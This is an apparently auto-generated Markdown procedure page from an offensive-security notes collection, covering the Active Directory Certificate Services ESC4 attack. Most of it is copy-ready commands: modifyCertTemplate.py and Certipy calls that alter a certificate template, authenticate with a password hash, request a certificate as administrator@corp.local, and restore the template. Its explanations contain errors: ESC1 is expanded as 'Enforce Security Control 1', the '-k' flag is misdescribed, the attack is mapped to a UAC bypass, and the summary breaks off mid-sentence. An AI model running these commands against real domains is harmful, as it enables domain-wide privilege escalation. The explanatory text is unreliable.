---
id: f7be8a46-db1a-43f4-9a34-220ec48fd957
name: Active Directory Certificate Services Access Control Vulnerabilities
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:05.859259+00:00'
updated_at: '2023-04-10T20:25:59.001305+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]'
sub_techniques:
- '[[Bypass User Account Control|T1548.002 - Bypass User Account Control]]'
tags:
- '[[Active Directory Attacks]]'
- '[[Active Directory Certificate Services]]'
- '[[ESC4 - Access Control Vulnerabilities]]'
commands:
- '[[Configure ESC1 Vulnerability]]'
- '[[Modify Certificate Template]]'
- '[[Modify Certificate Template for domain.local/user]]'
- '[[Request Certificate with ESC4 Template]]'
- '[[Restore Old Configuration]]'
---

# Active Directory Certificate Services Access Control Vulnerabilities

## Summary

Active Directory Certificate Services (AD CS) is a server role that enables you to build a public key infrastructure (PKI) and provide digital certificates to your organization. This procedure exploits access control vulnerabilities in AD CS to elevate privileges and bypass user account control. By

## Description

# Description

Active Directory Certificate Services (AD CS) is a server role that enables you to build a public key infrastructure (PKI) and provide digital certificates to your organization. This procedure exploits access control vulnerabilities in AD CS to elevate privileges and bypass user account control. By modifying certificate templates and adding flags, an attacker can create certificates with elevated privileges and access sensitive information. This attack can be used to gain access to critical systems and data, and can be difficult to detect.

 

## Requirements

1. Access to the target network

1. Authenticated access to AD CS

1. Knowledge of AD CS certificate templates

1. Certipy tool

 

## Defense

1. Implement least privilege access control to limit access to AD CS

1. Regularly review and update access control policies for AD CS

1. Monitor AD CS logs for suspicious activity

 

## Objectives

1. Elevate privileges to gain access to sensitive information

1. Bypass user account control to execute malicious code

1. Gain persistence on the target system

 

# Instructions

1. Use this command to modify the certificate template for a user in a domain. The '-k' option specifies that the user's password should be used for authentication, '-no-pass' specifies that no password should be used, '-template' specifies the name of the certificate template to be modified, and '-dc-ip' specifies the IP address of the domain controller. The '-get-acl' option is used to retrieve the access control list for the certificate template.

 



**Code**: [[python3 modifyCertTemplate.py domain.local/user -k]]



> This command can be used to modify the certificate template for a user in a domain. The '-k' option specifies that the user's password should be used for authentication, '-no-pass' specifies that no password should be used, '-template' specifies the name of the certificate template to be modified, and '-dc-ip' specifies the IP address of the domain controller. The '-get-acl' option is used to retrieve the access control list for the certificate template. The command searches for 'WriteProperty' with value '00000000-0000-0000-0000-000000000000' in order to modify the certificate template.



**Command** ([[Modify Certificate Template for domain.local/user]]):

```bash
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -get-acl
```



2. To add the `ENROLLEE_SUPPLIES_SUBJECT` flag to the WebServer template, run the following command:

python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag

Once the command has run successfully, the ESS flag will be added to the WebServer template and you will be able to perform ESC1.

 



**Code**: [[python3 modifyCertTemplate.py domain.local/user -k]]



> The `ENROLLEE_SUPPLIES_SUBJECT` (ESS) flag is used to enable the enrollment agent to supply the subject name for a certificate request. This is useful when the certificate request is being made on behalf of another user or device. The `mspki-Certificate-Name-Flag` property is used to specify the certificate name flag that is being added to the template. The `modifyCertTemplate.py` script is used to modify the certificate template and add the ESS flag to the WebServer template. The `dc-ip` parameter is used to specify the IP address of the domain controller. Once the ESS flag has been added to the WebServer template, you can use the `StandIn.exe` tool to perform ESC1.

3. This command modifies the certificate template for a user by setting the value of the mspki-Certificate-Name-Flag property to 0. The -k and -no-pass arguments are used for authentication. The -template argument specifies the template to be modified. The -dc-ip argument specifies the IP address of the domain controller. The -value argument specifies the value to be set for the property. This command should be run after performing ESC1 (Enforce Security Control 1) and the original value of the property should be restored after the modification is complete.

 



**Code**: [[python3 modifyCertTemplate.py domain.local/user -k]]



> The mspki-Certificate-Name-Flag property is used to control the format of the certificate name. A value of 0 indicates that the certificate name should be constructed using the user principal name (UPN) of the user. This command can be useful for modifying certificate templates to meet specific requirements or to troubleshoot issues related to certificate name formats.



**Command** ([[Modify Certificate Template]]):

```bash
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
```



4. This command uses Certipy to overwrite the configuration to make it vulnerable to ESC1. It then requests a certificate based on the ESC4 template, just like ESC1. Finally, it restores the old configuration.

 



**Code**: [[# overwrite the configuration to make it vulnerabl]]



> The certipy template command is used to overwrite the current configuration to make it vulnerable to ESC1. The -hashes flag specifies the password hash for the user account. The certipy req command is then used to request a certificate based on the ESC4 template, with the -alt flag specifying the email address for the certificate. Finally, the certipy template command is used again to restore the old configuration.



**Command** ([[Configure ESC1 Vulnerability]]):

```bash
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -save-old
```





**Command** ([[Request Certificate with ESC4 Template]]):

```bash
certipy req 'corp.local/john:Passw0rd!@ca.corp.local' -ca 'corp-CA' -template 'ESC4' -alt 'administrator@corp.local'
```





**Command** ([[Restore Old Configuration]]):

```bash
certipy template 'corp.local/johnpc$@ca.corp.local' -hashes :fc525c9683e8fe067095ba2ddc971889 -template 'ESC4' -configuration ESC4.json
```



## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Abuse Elevation Control Mechanism|T1548 - Abuse Elevation Control Mechanism]]

### Sub-Techniques

- [[Bypass User Account Control|T1548.002 - Bypass User Account Control]]

## Commands Used

- [[Configure ESC1 Vulnerability]]
- [[Modify Certificate Template]]
- [[Modify Certificate Template for domain.local/user]]
- [[Request Certificate with ESC4 Template]]
- [[Restore Old Configuration]]

## Tags

- [[Active Directory Attacks]]
- [[Active Directory Certificate Services]]
- [[ESC4 - Access Control Vulnerabilities]]


